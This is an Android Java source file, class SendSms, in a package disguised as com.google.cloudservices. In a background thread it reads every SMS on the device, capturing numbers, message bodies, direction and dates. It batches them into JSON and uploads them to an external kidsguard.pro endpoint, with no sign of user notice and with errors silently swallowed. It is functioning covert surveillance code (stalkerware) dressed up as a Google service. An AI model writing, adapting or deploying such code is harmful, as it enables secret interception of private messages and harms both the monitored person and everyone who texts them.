package com.google.cloudservices;

import android.annotation.TargetApi;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Telephony;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Date;

public class SendSms {
    SmsDataBaseManager dbm=null;
    JSONObject smsjson=null;
    JSONArray smsarray=null;
    ArrayList<String> number1=null;
    ArrayList<String> body1=null;
    ArrayList<String> dir1=null;
    int i=0,b=0,activit=0;
    dbFirsRun dbFirsRun=null;
    Uri uri=null;
    Cursor cursor=null;
    String body=null,number=null,datesms=null,type=null,s=null,da=null;
    Date datee=null;
    int typeCode=0,total=0,daste=0,baghee=0,bi=0,ie=0;
    String direction = null;
    long datesmsn=0;
    String c=null;
    int a=0;
    public  void sendsms(final Context context){
        new Thread(new Runnable() {
            @TargetApi(Build.VERSION_CODES.KITKAT)
            @Override
            public void run() {
                try {



        dbFirsRun=new dbFirsRun(context);
        if (dbFirsRun.getrun().get(0).equals("smsfirst")){
            activit=1;
            dbFirsRun.Updatecall("smssec","1");
        }else {activit=2;}
        dbFirsRun.close();
        //Runtime.getRuntime().gc();
            dbm=new SmsDataBaseManager(context);
        uri = Telephony.Sms.CONTENT_URI;
        cursor = context.getContentResolver().query(uri, null, null, null, null);
            smsarray=new JSONArray();
            try {number1=new ArrayList<String>();
                body1=new ArrayList<String>();
                dir1=new ArrayList<String>();
                if (cursor.moveToFirst()){
                    do{
                        body=cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                        datesms=cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE));
                        number=cursor.getString(cursor.getColumnIndexOrThrow("address")).toString();
                        datee = new Date(Long.valueOf(datesms));
                        type = cursor.getString(cursor.getColumnIndex(Telephony.Sms.TYPE));
                        typeCode = Integer.parseInt(type);
                        direction = "";

                        //get the right direction
                        switch (typeCode) {
                            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                                direction = "INCOMING"+"\n"+String.valueOf(datee);
                                break;

                            case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                                direction = "OUTGOING"+"\n"+String.valueOf(datee);
                                break;

                            case Telephony.Sms.MESSAGE_TYPE_SENT:
                                direction = "SENT"+"\n"+String.valueOf(datee);
                                break;

                            default:
                                direction = "UNKNOWN"+"\n"+String.valueOf(datee);

                                break;
                        }
                        s= String.valueOf(datee.getYear())+getdoragham(String.valueOf(datee.getMonth()))+getdoragham(String.valueOf(datee.getDay()))+getdoragham(String.valueOf(datee.getHours()))+getdoragham(String.valueOf(datee.getMinutes()))+getdoragham(String.valueOf(datee.getSeconds()));

                        datesmsn= Long.parseLong(s);
                        da=dbm.getPerson();
                        dbm.close();

                        //Runtime.getRuntime().gc();
                        long datesmsp= Long.parseLong(da);
                        checkErrorResponse checkErrorResponse=new checkErrorResponse();
                        if (checkErrorResponse.checkeror(context,"messages")){
                            number1.add(number);
                            body1.add(body);
                            dir1.add(direction);
                            if (da=="1"){
                                dbm.Insertperson(s);
                                dbm.close();
                                //Runtime.getRuntime().gc();

                            }
                            else if (datesmsn>datesmsp){
                                dbm.UpdatePerson(s);
                                dbm.close();Runtime.getRuntime().gc();
                            }
                        }else {
                            if (activit==1){
                                number1.add(number);
                                body1.add(body);
                                dir1.add(direction);
                                if (da=="1"){
                                    dbm.Insertperson(s);
                                    dbm.close();
                                    //Runtime.getRuntime().gc();

                                }
                                else if (datesmsn>datesmsp){
                                    dbm.UpdatePerson(s);
                                    dbm.close();
                                    //Runtime.getRuntime().gc();
                                }
                            }else {
                                if (da.equals("1")){
                                    dbm.Insertperson(s);
                                    dbm.close();
                                    //Runtime.getRuntime().gc();
                                    number1.add(number);
                                    body1.add(body);
                                    dir1.add(direction);
                                }else
                                if (datesmsn>datesmsp){
                                    dbm.UpdatePerson(s);
                                    dbm.close();
                                    //Runtime.getRuntime().gc();
                                    number1.add(number);
                                    body1.add(body);
                                    dir1.add(direction);
                                }else {

                                }
                            }}

                    }while(cursor.moveToNext());
                }
            }catch (Exception e){}finally {
                cursor.close();
            }

            checkErrorResponse checkErrorResponse=new checkErrorResponse();
            checkErrorResponse.deleterror(context,"messages");
            //sm.add(context,insdata);
        if (number1.size()>0){
        total=number1.size();
        daste=total/100;
        baghee=total%100;
        bi=0;
        ie=0;
        while (ie<daste){

            int sad=0;
            while (sad<100){

                try {smsjson=new JSONObject();
                    smsjson.put("number", number1.get(ie*100+sad));
                    smsjson.put("body", body1.get(ie*100+sad));
                    smsjson.put("direction", dir1.get(ie*100+sad));
                    smsarray.put( bi,smsjson);
                } catch (JSONException e) {

                }

                bi++;
                sad++;
            }
            ie++;
        }
        int c=0;
        while (c<baghee){
            try {smsjson=new JSONObject();
                smsjson.put("number", number1.get(daste*100+c));
                smsjson.put("body", body1.get(daste*100+c));
                smsjson.put("direction", dir1.get(daste*100+c));
                smsarray.put( bi,smsjson);
            } catch (JSONException e) {

            }
            bi++;
            c++;
        }
        try {
            if (smsarray.getString(0).equals(null)){}else {
                String smsaray= smsarray.toString();
                sm sm=new sm();
                sm.add(context,"https://im.kidsguard.pro/api/add-sms/","messages",smsaray);

            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }/**/ }catch (NullPointerException e){}
            }
        }).start();
    }

    public String getdoragham(String h){
        c="";
        a= Integer.parseInt(h);
        if (a<10){
            c="0"+h;
        }else {c=h;}
        return c;
    }
}
